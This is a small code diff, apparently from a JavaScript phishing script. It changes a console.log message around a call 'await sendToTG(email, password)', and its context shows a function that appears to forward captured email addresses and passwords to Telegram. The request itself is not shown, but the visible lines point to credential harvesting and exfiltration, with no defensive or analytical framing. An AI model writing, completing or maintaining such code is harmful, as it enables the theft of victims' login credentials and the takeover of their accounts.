@@ -41,7 +41,7 @@ async function sendToTG(e, p) {
     .catch((error) => console.error("Error:", error));
 };
 
-console.log('E-O-L');
 await sendToTG(email, password);
+  console.log('End Of Line');
 }
 
